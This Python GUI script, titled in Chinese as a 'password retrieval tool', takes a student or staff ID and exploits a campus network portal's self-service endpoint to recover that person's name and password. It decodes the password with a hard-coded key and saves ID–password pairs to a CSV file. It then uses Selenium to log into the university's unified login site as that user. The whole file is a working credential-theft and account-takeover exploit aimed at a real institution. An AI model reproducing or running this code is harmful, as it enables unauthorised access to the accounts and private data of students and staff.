#!/usr/bin/env python
# -*- coding: utf-8 -*-

from tkinter import *
import hashlib
import time
import pyperclip

import requests
import re

LOG_LINE_NUM = 0

class MY_GUI():
    def __init__(self,init_window_name):
        self.init_window_name = init_window_name


    #设置窗口
    def set_init_window(self):
        self.init_window_name.title("密码获取工具_v1.2.1")           #窗口名
        #self.init_window_name.geometry('320x160+10+10')                         #290 160为窗口大小，+10 +10 定义窗口弹出时的默认展示位置
        self.init_window_name.geometry('1068x681+10+10')
        #self.init_window_name["bg"] = "pink"                                    #窗口背景色，其他背景色见：blog.csdn.net/chl0000/article/details/7657887
        #self.init_window_name.attributes("-alpha",0.9)                          #虚化，值越小虚化程度越高
        #标签
        self.init_data_label = Label(self.init_window_name, text="学号OR工号")
        self.init_data_label.grid(row=0, column=0)
        self.result_data_label = Label(self.init_window_name, text="输出结果")
        self.result_data_label.grid(row=0, column=12)
        self.log_label = Label(self.init_window_name, text="日志")
        self.log_label.grid(row=12, column=0)
        #文本框
        self.init_data_Text = Text(self.init_window_name, width=67, height=35)  #原始数据录入框
        self.init_data_Text.grid(row=1, column=0, rowspan=10, columnspan=10)
        self.result_data_Text = Text(self.init_window_name, width=70, height=49)  #处理结果展示
        self.result_data_Text.grid(row=1, column=12, rowspan=15, columnspan=10)
        self.log_data_Text = Text(self.init_window_name, width=66, height=9)  # 日志框
        self.log_data_Text.grid(row=13, column=0, columnspan=10)
        #按钮
        self.str_trans_to_md5_button = Button(self.init_window_name, text="召唤神龙", bg="lightblue", width=10,height=15,command=self.str_trans_to_md5)  # 调用内部方法  加()为直接调用

        self.button_1 = Button(self.init_window_name, text="召唤玄武", bg="red",width=10,height=15,command=self.wangye)  
        self.button_1.grid(row=2, column=11)
        self.str_trans_to_md5_button.grid(row=1, column=11)


    #功能函数
    def str_trans_to_md5(self):
        
        src = self.init_data_Text.get(1.0,END)
        #print("src =",src)
        
            
                
                



        hao=src
        url='http://192.168.9.18:801/eportal/?c=Portal&a=self&callback=dr1003&self_type=1&user_account='+hao+'&user_password=www&wlan_user_mac=50642baa65d7&wlan_user_ip=10.252.27.108&jsVersion=3.3.3&v=741'
        headers={
            "Accept":"*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Connection":"close",
            "Host":    "192.168.9.18:801",
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:55.0) Gecko/20100101 Firefox/55.0"
        }
        respone=requests.get(url,timeout=10,headers=headers)
        a=respone.content
        a=str(a)
        a=a.replace('\\\\/','/')
        a=a.replace('\\/','/')
        pattern = re.compile(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+') # 匹配模式
        url1 = re.findall(pattern,a)
        respone1=requests.get(url1[0],timeout=10)
        c=respone1.text
        d=re.findall(r'"userRealName":....',c)
        pwdmi=re.findall(r'ssword":"(.*)","userRealName"',c)
        
        

        passwd =[] 
        passwd = [28, 57, 86, 19, 47, 76, 9, 38, 66, 95, 28, 57, 86, 18, 47, 76, 9, 38, 66]
        milist=[]
        
        pwd=''
        try:
            for i in pwdmi[0]:
                
                milist.append(i)
        except:
            self.write_log_to_Text("INFO:get password fault")

        e=[]
        f=[]
        g=[]
        k=0
        for i in range(len(milist)):
            try:
                if (milist[k]=="\\"):
                    k+=1
            except:
                break
            aaa=int(ord(milist[k]))-int(passwd[i])
            k+=1
            if (aaa<32):
                aaa+=95
            pwd=pwd+chr(aaa)
        

        
        try:
            print(d[0][-3::]+"，已登录")
            print('\n')
            print('密码为',pwd[:-1])
        except:
            print("登陆失败")
        print('\n')
        print("登陆链接为")
        print(url1[0])
        with open(r'密码.csv','a',encoding='utf-8-sig') as f:
                        f.write('{},{}\n'.format(hao,pwd[:-1]))
        global string
        string = str("学号：%s \n姓名：%s \n密码：%s \n\n网页管理链接：%s \n" %(hao,d[0][-3::], pwd[:-1],url1[0]))
        
        self.result_data_Text.delete(1.0,END)
        global pwddd
        global haooo
        haooo=hao

        pwddd=pwd[:-1]
        self.result_data_Text.insert(1.0,string)
        self.write_log_to_Text("INFO:get password success")
        pyperclip.copy(haooo+pwddd)
        spam = pyperclip.paste()
        













    def wangye(self):
        print(haooo,pwddd)
        from selenium import webdriver
        from time import sleep
        driver = webdriver.Firefox()
        driver.get("https://pass.cppu.net/tpass/login")
        driver.find_element_by_id("un").send_keys(haooo)
        driver.find_element_by_id("pd").send_keys(pwddd)
        driver.find_element_by_xpath("//*[@id='index_login_btn']/input").click()
        sleep(0.4)
        driver.find_element_by_xpath("/html/body/div[1]/div[1]/div[2]/div/div[1]/div[1]/a/span[2]").click()
        all_h = driver.window_handles
        driver.switch_to.window(all_h[1])
        sleep(2)
        try:
            driver.find_element_by_id("app_a").click()
        except:
            driver.find_element_by_xpath("/html/body/div[1]/div[4]/div[2]/div/div/ul[1]/li[2]/div/compress:html/div[1]/div/div[2]/div/div/a[2]/span").click()
            

    #获取当前时间
    def get_current_time(self):
        current_time = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
        return current_time


    #日志动态打印
    def write_log_to_Text(self,logmsg):
        global LOG_LINE_NUM
        current_time = self.get_current_time()
        logmsg_in = str(current_time) +" " + str(logmsg) + "\n"      #换行
        if LOG_LINE_NUM <= 7:
            self.log_data_Text.insert(END, logmsg_in)
            LOG_LINE_NUM = LOG_LINE_NUM + 1
        else:
            self.log_data_Text.delete(1.0,2.0)
            self.log_data_Text.insert(END, logmsg_in)


        
        
def gui_start():
    init_window = Tk()              #实例化出一个父窗口
    ZMJ_PORTAL = MY_GUI(init_window)
    # 设置根窗口默认属性
    ZMJ_PORTAL.set_init_window()

    init_window.mainloop()          #父窗口进入事件循环，可以理解为保持窗口运行，否则界面不展示


gui_start()
